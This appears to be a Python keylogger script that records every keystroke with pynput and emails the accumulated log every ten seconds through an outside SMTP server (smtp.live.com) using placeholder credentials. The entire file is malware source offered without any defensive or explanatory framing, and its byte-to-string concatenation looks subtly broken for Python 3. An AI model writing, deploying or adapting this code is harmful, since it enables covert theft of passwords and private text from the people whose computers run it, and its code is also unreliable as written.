import pynput.keyboard as pynput
import smtplib
import threading

log = """
start

"""

def callback_function(key):
    try:
        global log
        log = log + key.char.encode("utf-8")

    except (AttributeError):
        if (key == key.space):
            log = log + " "

        else:
            log = log + str(key)

def send_mail(email,to_email,password,msg):
    server = smtplib.SMTP("smtp.live.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,to_email,msg)
    server.quit()

def threading_func():
    global log
    send_mail("email","to_email","password",log)
    log = """
    
    """
    timer = threading.Timer(10,threading_func)
    timer.start()

listener = pynput.Listener(on_press=callback_function)

with listener:
    threading_func()
    listener.join()